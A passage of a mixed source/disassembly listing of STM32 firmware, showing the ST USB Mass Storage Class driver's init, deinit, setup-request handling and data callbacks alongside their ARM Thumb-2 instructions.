 8008ffe:	d12b      	bne.n	8009058 <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8009000:	4b2e      	ldr	r3, [pc, #184]	; (80090bc <USBD_MSC_Init+0x118>)
 8009002:	7819      	ldrb	r1, [r3, #0]
 8009004:	f44f 7300 	mov.w	r3, #512	; 0x200
 8009008:	2202      	movs	r2, #2
 800900a:	6878      	ldr	r0, [r7, #4]
 800900c:	f003 feca 	bl	800cda4 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8009010:	4b2a      	ldr	r3, [pc, #168]	; (80090bc <USBD_MSC_Init+0x118>)
 8009012:	781b      	ldrb	r3, [r3, #0]
 8009014:	f003 020f 	and.w	r2, r3, #15
 8009018:	6879      	ldr	r1, [r7, #4]
 800901a:	4613      	mov	r3, r2
 800901c:	009b      	lsls	r3, r3, #2
 800901e:	4413      	add	r3, r2
 8009020:	009b      	lsls	r3, r3, #2
 8009022:	440b      	add	r3, r1
 8009024:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8009028:	2201      	movs	r2, #1
 800902a:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 800902c:	4b24      	ldr	r3, [pc, #144]	; (80090c0 <USBD_MSC_Init+0x11c>)
 800902e:	7819      	ldrb	r1, [r3, #0]
 8009030:	f44f 7300 	mov.w	r3, #512	; 0x200
 8009034:	2202      	movs	r2, #2
 8009036:	6878      	ldr	r0, [r7, #4]
 8009038:	f003 feb4 	bl	800cda4 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 800903c:	4b20      	ldr	r3, [pc, #128]	; (80090c0 <USBD_MSC_Init+0x11c>)
 800903e:	781b      	ldrb	r3, [r3, #0]
 8009040:	f003 020f 	and.w	r2, r3, #15
 8009044:	6879      	ldr	r1, [r7, #4]
 8009046:	4613      	mov	r3, r2
 8009048:	009b      	lsls	r3, r3, #2
 800904a:	4413      	add	r3, r2
 800904c:	009b      	lsls	r3, r3, #2
 800904e:	440b      	add	r3, r1
 8009050:	3324      	adds	r3, #36	; 0x24
 8009052:	2201      	movs	r2, #1
 8009054:	801a      	strh	r2, [r3, #0]
 8009056:	e028      	b.n	80090aa <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8009058:	4b18      	ldr	r3, [pc, #96]	; (80090bc <USBD_MSC_Init+0x118>)
 800905a:	7819      	ldrb	r1, [r3, #0]
 800905c:	2340      	movs	r3, #64	; 0x40
 800905e:	2202      	movs	r2, #2
 8009060:	6878      	ldr	r0, [r7, #4]
 8009062:	f003 fe9f 	bl	800cda4 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8009066:	4b15      	ldr	r3, [pc, #84]	; (80090bc <USBD_MSC_Init+0x118>)
 8009068:	781b      	ldrb	r3, [r3, #0]
 800906a:	f003 020f 	and.w	r2, r3, #15
 800906e:	6879      	ldr	r1, [r7, #4]
 8009070:	4613      	mov	r3, r2
 8009072:	009b      	lsls	r3, r3, #2
 8009074:	4413      	add	r3, r2
 8009076:	009b      	lsls	r3, r3, #2
 8009078:	440b      	add	r3, r1
 800907a:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800907e:	2201      	movs	r2, #1
 8009080:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8009082:	4b0f      	ldr	r3, [pc, #60]	; (80090c0 <USBD_MSC_Init+0x11c>)
 8009084:	7819      	ldrb	r1, [r3, #0]
 8009086:	2340      	movs	r3, #64	; 0x40
 8009088:	2202      	movs	r2, #2
 800908a:	6878      	ldr	r0, [r7, #4]
 800908c:	f003 fe8a 	bl	800cda4 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8009090:	4b0b      	ldr	r3, [pc, #44]	; (80090c0 <USBD_MSC_Init+0x11c>)
 8009092:	781b      	ldrb	r3, [r3, #0]
 8009094:	f003 020f 	and.w	r2, r3, #15
 8009098:	6879      	ldr	r1, [r7, #4]
 800909a:	4613      	mov	r3, r2
 800909c:	009b      	lsls	r3, r3, #2
 800909e:	4413      	add	r3, r2
 80090a0:	009b      	lsls	r3, r3, #2
 80090a2:	440b      	add	r3, r1
 80090a4:	3324      	adds	r3, #36	; 0x24
 80090a6:	2201      	movs	r2, #1
 80090a8:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 80090aa:	6878      	ldr	r0, [r7, #4]
 80090ac:	f000 fa2c 	bl	8009508 <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 80090b0:	2300      	movs	r3, #0
}
 80090b2:	4618      	mov	r0, r3
 80090b4:	3710      	adds	r7, #16
 80090b6:	46bd      	mov	sp, r7
 80090b8:	bd80      	pop	{r7, pc}
 80090ba:	bf00      	nop
 80090bc:	2000010b 	.word	0x2000010b
 80090c0:	2000010a 	.word	0x2000010a

080090c4 <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 80090c4:	b580      	push	{r7, lr}
 80090c6:	b082      	sub	sp, #8
 80090c8:	af00      	add	r7, sp, #0
 80090ca:	6078      	str	r0, [r7, #4]
 80090cc:	460b      	mov	r3, r1
 80090ce:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 80090d0:	4b26      	ldr	r3, [pc, #152]	; (800916c <USBD_MSC_DeInit+0xa8>)
 80090d2:	781b      	ldrb	r3, [r3, #0]
 80090d4:	4619      	mov	r1, r3
 80090d6:	6878      	ldr	r0, [r7, #4]
 80090d8:	f003 fea2 	bl	800ce20 <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 80090dc:	4b23      	ldr	r3, [pc, #140]	; (800916c <USBD_MSC_DeInit+0xa8>)
 80090de:	781b      	ldrb	r3, [r3, #0]
 80090e0:	f003 020f 	and.w	r2, r3, #15
 80090e4:	6879      	ldr	r1, [r7, #4]
 80090e6:	4613      	mov	r3, r2
 80090e8:	009b      	lsls	r3, r3, #2
 80090ea:	4413      	add	r3, r2
 80090ec:	009b      	lsls	r3, r3, #2
 80090ee:	440b      	add	r3, r1
 80090f0:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 80090f4:	2200      	movs	r2, #0
 80090f6:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 80090f8:	4b1d      	ldr	r3, [pc, #116]	; (8009170 <USBD_MSC_DeInit+0xac>)
 80090fa:	781b      	ldrb	r3, [r3, #0]
 80090fc:	4619      	mov	r1, r3
 80090fe:	6878      	ldr	r0, [r7, #4]
 8009100:	f003 fe8e 	bl	800ce20 <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 8009104:	4b1a      	ldr	r3, [pc, #104]	; (8009170 <USBD_MSC_DeInit+0xac>)
 8009106:	781b      	ldrb	r3, [r3, #0]
 8009108:	f003 020f 	and.w	r2, r3, #15
 800910c:	6879      	ldr	r1, [r7, #4]
 800910e:	4613      	mov	r3, r2
 8009110:	009b      	lsls	r3, r3, #2
 8009112:	4413      	add	r3, r2
 8009114:	009b      	lsls	r3, r3, #2
 8009116:	440b      	add	r3, r1
 8009118:	3324      	adds	r3, #36	; 0x24
 800911a:	2200      	movs	r2, #0
 800911c:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 800911e:	687b      	ldr	r3, [r7, #4]
 8009120:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009124:	687b      	ldr	r3, [r7, #4]
 8009126:	32b0      	adds	r2, #176	; 0xb0
 8009128:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800912c:	2b00      	cmp	r3, #0
 800912e:	d018      	beq.n	8009162 <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8009130:	6878      	ldr	r0, [r7, #4]
 8009132:	f000 fa6f 	bl	8009614 <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8009136:	687b      	ldr	r3, [r7, #4]
 8009138:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800913c:	687b      	ldr	r3, [r7, #4]
 800913e:	32b0      	adds	r2, #176	; 0xb0
 8009140:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009144:	4618      	mov	r0, r3
 8009146:	f004 f87d 	bl	800d244 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 800914a:	687b      	ldr	r3, [r7, #4]
 800914c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009150:	687b      	ldr	r3, [r7, #4]
 8009152:	32b0      	adds	r2, #176	; 0xb0
 8009154:	2100      	movs	r1, #0
 8009156:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 800915a:	687b      	ldr	r3, [r7, #4]
 800915c:	2200      	movs	r2, #0
 800915e:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8009162:	2300      	movs	r3, #0
}
 8009164:	4618      	mov	r0, r3
 8009166:	3708      	adds	r7, #8
 8009168:	46bd      	mov	sp, r7
 800916a:	bd80      	pop	{r7, pc}
 800916c:	2000010b 	.word	0x2000010b
 8009170:	2000010a 	.word	0x2000010a

08009174 <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 8009174:	b580      	push	{r7, lr}
 8009176:	b086      	sub	sp, #24
 8009178:	af00      	add	r7, sp, #0
 800917a:	6078      	str	r0, [r7, #4]
 800917c:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800917e:	687b      	ldr	r3, [r7, #4]
 8009180:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009184:	687b      	ldr	r3, [r7, #4]
 8009186:	32b0      	adds	r2, #176	; 0xb0
 8009188:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800918c:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 800918e:	2300      	movs	r3, #0
 8009190:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 8009192:	2300      	movs	r3, #0
 8009194:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009196:	693b      	ldr	r3, [r7, #16]
 8009198:	2b00      	cmp	r3, #0
 800919a:	d101      	bne.n	80091a0 <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 800919c:	2303      	movs	r3, #3
 800919e:	e0e1      	b.n	8009364 <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 80091a0:	683b      	ldr	r3, [r7, #0]
 80091a2:	781b      	ldrb	r3, [r3, #0]
 80091a4:	f003 0360 	and.w	r3, r3, #96	; 0x60
 80091a8:	2b00      	cmp	r3, #0
 80091aa:	d053      	beq.n	8009254 <USBD_MSC_Setup+0xe0>
 80091ac:	2b20      	cmp	r3, #32
 80091ae:	f040 80d1 	bne.w	8009354 <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 80091b2:	683b      	ldr	r3, [r7, #0]
 80091b4:	785b      	ldrb	r3, [r3, #1]
 80091b6:	2bfe      	cmp	r3, #254	; 0xfe
 80091b8:	d002      	beq.n	80091c0 <USBD_MSC_Setup+0x4c>
 80091ba:	2bff      	cmp	r3, #255	; 0xff
 80091bc:	d02a      	beq.n	8009214 <USBD_MSC_Setup+0xa0>
 80091be:	e041      	b.n	8009244 <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 80091c0:	683b      	ldr	r3, [r7, #0]
 80091c2:	885b      	ldrh	r3, [r3, #2]
 80091c4:	2b00      	cmp	r3, #0
 80091c6:	d11e      	bne.n	8009206 <USBD_MSC_Setup+0x92>
 80091c8:	683b      	ldr	r3, [r7, #0]
 80091ca:	88db      	ldrh	r3, [r3, #6]
 80091cc:	2b01      	cmp	r3, #1
 80091ce:	d11a      	bne.n	8009206 <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 80091d0:	683b      	ldr	r3, [r7, #0]
 80091d2:	781b      	ldrb	r3, [r3, #0]
 80091d4:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 80091d6:	2b00      	cmp	r3, #0
 80091d8:	da15      	bge.n	8009206 <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 80091da:	687b      	ldr	r3, [r7, #4]
 80091dc:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80091e0:	687a      	ldr	r2, [r7, #4]
 80091e2:	33b0      	adds	r3, #176	; 0xb0
 80091e4:	009b      	lsls	r3, r3, #2
 80091e6:	4413      	add	r3, r2
 80091e8:	685b      	ldr	r3, [r3, #4]
 80091ea:	699b      	ldr	r3, [r3, #24]
 80091ec:	4798      	blx	r3
 80091ee:	4603      	mov	r3, r0
 80091f0:	461a      	mov	r2, r3
 80091f2:	693b      	ldr	r3, [r7, #16]
 80091f4:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 80091f6:	693b      	ldr	r3, [r7, #16]
 80091f8:	2201      	movs	r2, #1
 80091fa:	4619      	mov	r1, r3
 80091fc:	6878      	ldr	r0, [r7, #4]
 80091fe:	f003 f979 	bl	800c4f4 <USBD_CtlSendData>
 8009202:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009204:	e025      	b.n	8009252 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8009206:	6839      	ldr	r1, [r7, #0]
 8009208:	6878      	ldr	r0, [r7, #4]
 800920a:	f003 f902 	bl	800c412 <USBD_CtlError>
            ret = USBD_FAIL;
 800920e:	2303      	movs	r3, #3
 8009210:	75fb      	strb	r3, [r7, #23]
          break;
 8009212:	e01e      	b.n	8009252 <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8009214:	683b      	ldr	r3, [r7, #0]
 8009216:	885b      	ldrh	r3, [r3, #2]
 8009218:	2b00      	cmp	r3, #0
 800921a:	d10c      	bne.n	8009236 <USBD_MSC_Setup+0xc2>
 800921c:	683b      	ldr	r3, [r7, #0]
 800921e:	88db      	ldrh	r3, [r3, #6]
 8009220:	2b00      	cmp	r3, #0
 8009222:	d108      	bne.n	8009236 <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 8009224:	683b      	ldr	r3, [r7, #0]
 8009226:	781b      	ldrb	r3, [r3, #0]
 8009228:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 800922a:	2b00      	cmp	r3, #0
 800922c:	db03      	blt.n	8009236 <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 800922e:	6878      	ldr	r0, [r7, #4]
 8009230:	f000 f9bc 	bl	80095ac <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009234:	e00d      	b.n	8009252 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8009236:	6839      	ldr	r1, [r7, #0]
 8009238:	6878      	ldr	r0, [r7, #4]
 800923a:	f003 f8ea 	bl	800c412 <USBD_CtlError>
            ret = USBD_FAIL;
 800923e:	2303      	movs	r3, #3
 8009240:	75fb      	strb	r3, [r7, #23]
          break;
 8009242:	e006      	b.n	8009252 <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 8009244:	6839      	ldr	r1, [r7, #0]
 8009246:	6878      	ldr	r0, [r7, #4]
 8009248:	f003 f8e3 	bl	800c412 <USBD_CtlError>
          ret = USBD_FAIL;
 800924c:	2303      	movs	r3, #3
 800924e:	75fb      	strb	r3, [r7, #23]
          break;
 8009250:	bf00      	nop
      }
      break;
 8009252:	e086      	b.n	8009362 <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8009254:	683b      	ldr	r3, [r7, #0]
 8009256:	785b      	ldrb	r3, [r3, #1]
 8009258:	2b0b      	cmp	r3, #11
 800925a:	d872      	bhi.n	8009342 <USBD_MSC_Setup+0x1ce>
 800925c:	a201      	add	r2, pc, #4	; (adr r2, 8009264 <USBD_MSC_Setup+0xf0>)
 800925e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8009262:	bf00      	nop
 8009264:	08009295 	.word	0x08009295
 8009268:	08009311 	.word	0x08009311
 800926c:	08009343 	.word	0x08009343
 8009270:	08009343 	.word	0x08009343
 8009274:	08009343 	.word	0x08009343
 8009278:	08009343 	.word	0x08009343
 800927c:	08009343 	.word	0x08009343
 8009280:	08009343 	.word	0x08009343
 8009284:	08009343 	.word	0x08009343
 8009288:	08009343 	.word	0x08009343
 800928c:	080092bf 	.word	0x080092bf
 8009290:	080092e9 	.word	0x080092e9
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009294:	687b      	ldr	r3, [r7, #4]
 8009296:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800929a:	b2db      	uxtb	r3, r3
 800929c:	2b03      	cmp	r3, #3
 800929e:	d107      	bne.n	80092b0 <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 80092a0:	f107 030e 	add.w	r3, r7, #14
 80092a4:	2202      	movs	r2, #2
 80092a6:	4619      	mov	r1, r3
 80092a8:	6878      	ldr	r0, [r7, #4]
 80092aa:	f003 f923 	bl	800c4f4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80092ae:	e050      	b.n	8009352 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 80092b0:	6839      	ldr	r1, [r7, #0]
 80092b2:	6878      	ldr	r0, [r7, #4]
 80092b4:	f003 f8ad 	bl	800c412 <USBD_CtlError>
            ret = USBD_FAIL;
 80092b8:	2303      	movs	r3, #3
 80092ba:	75fb      	strb	r3, [r7, #23]
          break;
 80092bc:	e049      	b.n	8009352 <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80092be:	687b      	ldr	r3, [r7, #4]
 80092c0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80092c4:	b2db      	uxtb	r3, r3
 80092c6:	2b03      	cmp	r3, #3
 80092c8:	d107      	bne.n	80092da <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 80092ca:	693b      	ldr	r3, [r7, #16]
 80092cc:	3304      	adds	r3, #4
 80092ce:	2201      	movs	r2, #1
 80092d0:	4619      	mov	r1, r3
 80092d2:	6878      	ldr	r0, [r7, #4]
 80092d4:	f003 f90e 	bl	800c4f4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80092d8:	e03b      	b.n	8009352 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 80092da:	6839      	ldr	r1, [r7, #0]
 80092dc:	6878      	ldr	r0, [r7, #4]
 80092de:	f003 f898 	bl	800c412 <USBD_CtlError>
            ret = USBD_FAIL;
 80092e2:	2303      	movs	r3, #3
 80092e4:	75fb      	strb	r3, [r7, #23]
          break;
 80092e6:	e034      	b.n	8009352 <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80092e8:	687b      	ldr	r3, [r7, #4]
 80092ea:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80092ee:	b2db      	uxtb	r3, r3
 80092f0:	2b03      	cmp	r3, #3
 80092f2:	d106      	bne.n	8009302 <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 80092f4:	683b      	ldr	r3, [r7, #0]
 80092f6:	885b      	ldrh	r3, [r3, #2]
 80092f8:	b2db      	uxtb	r3, r3
 80092fa:	461a      	mov	r2, r3
 80092fc:	693b      	ldr	r3, [r7, #16]
 80092fe:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009300:	e027      	b.n	8009352 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009302:	6839      	ldr	r1, [r7, #0]
 8009304:	6878      	ldr	r0, [r7, #4]
 8009306:	f003 f884 	bl	800c412 <USBD_CtlError>
            ret = USBD_FAIL;
 800930a:	2303      	movs	r3, #3
 800930c:	75fb      	strb	r3, [r7, #23]
          break;
 800930e:	e020      	b.n	8009352 <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009310:	687b      	ldr	r3, [r7, #4]
 8009312:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009316:	b2db      	uxtb	r3, r3
 8009318:	2b03      	cmp	r3, #3
 800931a:	d119      	bne.n	8009350 <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 800931c:	683b      	ldr	r3, [r7, #0]
 800931e:	885b      	ldrh	r3, [r3, #2]
 8009320:	2b00      	cmp	r3, #0
 8009322:	d115      	bne.n	8009350 <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 8009324:	683b      	ldr	r3, [r7, #0]
 8009326:	889b      	ldrh	r3, [r3, #4]
 8009328:	b2db      	uxtb	r3, r3
 800932a:	4619      	mov	r1, r3
 800932c:	6878      	ldr	r0, [r7, #4]
 800932e:	f003 fdad 	bl	800ce8c <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 8009332:	683b      	ldr	r3, [r7, #0]
 8009334:	889b      	ldrh	r3, [r3, #4]
 8009336:	b2db      	uxtb	r3, r3
 8009338:	4619      	mov	r1, r3
 800933a:	6878      	ldr	r0, [r7, #4]
 800933c:	f000 fb54 	bl	80099e8 <MSC_BOT_CplClrFeature>
            }
          }
          break;
 8009340:	e006      	b.n	8009350 <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 8009342:	6839      	ldr	r1, [r7, #0]
 8009344:	6878      	ldr	r0, [r7, #4]
 8009346:	f003 f864 	bl	800c412 <USBD_CtlError>
          ret = USBD_FAIL;
 800934a:	2303      	movs	r3, #3
 800934c:	75fb      	strb	r3, [r7, #23]
          break;
 800934e:	e000      	b.n	8009352 <USBD_MSC_Setup+0x1de>
          break;
 8009350:	bf00      	nop
      }
      break;
 8009352:	e006      	b.n	8009362 <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 8009354:	6839      	ldr	r1, [r7, #0]
 8009356:	6878      	ldr	r0, [r7, #4]
 8009358:	f003 f85b 	bl	800c412 <USBD_CtlError>
      ret = USBD_FAIL;
 800935c:	2303      	movs	r3, #3
 800935e:	75fb      	strb	r3, [r7, #23]
      break;
 8009360:	bf00      	nop
  }

  return (uint8_t)ret;
 8009362:	7dfb      	ldrb	r3, [r7, #23]
}
 8009364:	4618      	mov	r0, r3
 8009366:	3718      	adds	r7, #24
 8009368:	46bd      	mov	sp, r7
 800936a:	bd80      	pop	{r7, pc}

0800936c <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800936c:	b580      	push	{r7, lr}
 800936e:	b082      	sub	sp, #8
 8009370:	af00      	add	r7, sp, #0
 8009372:	6078      	str	r0, [r7, #4]
 8009374:	460b      	mov	r3, r1
 8009376:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 8009378:	78fb      	ldrb	r3, [r7, #3]
 800937a:	4619      	mov	r1, r3
 800937c:	6878      	ldr	r0, [r7, #4]
 800937e:	f000 f961 	bl	8009644 <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 8009382:	2300      	movs	r3, #0
}
 8009384:	4618      	mov	r0, r3
 8009386:	3708      	adds	r7, #8
 8009388:	46bd      	mov	sp, r7
 800938a:	bd80      	pop	{r7, pc}

0800938c <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800938c:	b580      	push	{r7, lr}
 800938e:	b082      	sub	sp, #8
 8009390:	af00      	add	r7, sp, #0
 8009392:	6078      	str	r0, [r7, #4]
 8009394:	460b      	mov	r3, r1
 8009396:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 8009398:	78fb      	ldrb	r3, [r7, #3]
 800939a:	4619      	mov	r1, r3
 800939c:	6878      	ldr	r0, [r7, #4]
 800939e:	f000 f98d 	bl	80096bc <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 80093a2:	2300      	movs	r3, #0
}
 80093a4:	4618      	mov	r0, r3
 80093a6:	3708      	adds	r7, #8
 80093a8:	46bd      	mov	sp, r7
 80093aa:	bd80      	pop	{r7, pc}

080093ac <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 80093ac:	b580      	push	{r7, lr}
 80093ae:	b084      	sub	sp, #16
 80093b0:	af00      	add	r7, sp, #0
 80093b2:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80093b4:	2181      	movs	r1, #129	; 0x81
 80093b6:	4812      	ldr	r0, [pc, #72]	; (8009400 <USBD_MSC_GetHSCfgDesc+0x54>)
 80093b8:	f002 f9c8 	bl	800b74c <USBD_GetEpDesc>
 80093bc:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80093be:	2101      	movs	r1, #1
 80093c0:	480f      	ldr	r0, [pc, #60]	; (8009400 <USBD_MSC_GetHSCfgDesc+0x54>)
 80093c2:	f002 f9c3 	bl	800b74c <USBD_GetEpDesc>
 80093c6:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80093c8:	68fb      	ldr	r3, [r7, #12]
 80093ca:	2b00      	cmp	r3, #0
 80093cc:	d006      	beq.n	80093dc <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 80093ce:	68fb      	ldr	r3, [r7, #12]
 80093d0:	2200      	movs	r2, #0
 80093d2:	711a      	strb	r2, [r3, #4]
 80093d4:	2200      	movs	r2, #0
 80093d6:	f042 0202 	orr.w	r2, r2, #2
 80093da:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80093dc:	68bb      	ldr	r3, [r7, #8]
 80093de:	2b00      	cmp	r3, #0
 80093e0:	d006      	beq.n	80093f0 <USBD_MSC_GetHSCfgDesc+0x44>
  {
